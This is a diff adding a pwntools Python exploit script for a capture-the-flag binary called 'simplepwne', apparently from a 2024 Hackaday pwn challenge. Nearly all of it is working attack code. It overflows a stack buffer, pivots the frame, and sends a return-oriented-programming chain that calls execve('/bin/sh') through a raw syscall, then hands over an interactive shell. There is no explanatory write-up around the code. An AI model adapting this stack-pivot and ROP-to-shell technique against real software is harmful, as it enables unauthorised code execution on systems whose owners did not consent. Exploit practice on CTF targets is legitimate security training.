@@ -1,0 +1,53 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./simplepwne")
+# context.log_level='debug'
+# p = remote("hackaday2024-53-pwn-challenge-f9dbdd7879849e5c.elb.us-west-2.amazonaws.com", 9998)
+p = process([exe.path])
+def gdbs():
+    context.terminal = ["foot"]
+    # gdb.attach(p, gdbscript="""
+    #
+    #            """)
+    p = gdb.debug([exe.path],"""
+
+                    """)
+    return p
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+
+pop_rdi = 0x000000000040230a
+pop_rsi = 0x000000000040499b
+pop_rax_rdx = 0x0000000000404513
+syscall = 0x0000000000401323
+buff = 0x407de0
+# p = gdbs()
+gadgets = 0x408408
+sla(":",b"a"*112+p64(buff)+p64(exe.sym.main+88))
+payload = b""
+payload += p64(pop_rsi)
+payload += p64(0)
+payload += p64(pop_rdi)
+payload += p64(buff-0x70)
+payload += p64(pop_rax_rdx)
+payload += p64(0x3b)+p64(0)
+payload += b"a"*0x28
+payload += p64(syscall)
+input()
+sl(b"/bin/sh\0".ljust(112,b"a")+p64(0x408360)+p64(exe.sym.main+110)+payload)
+
+
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
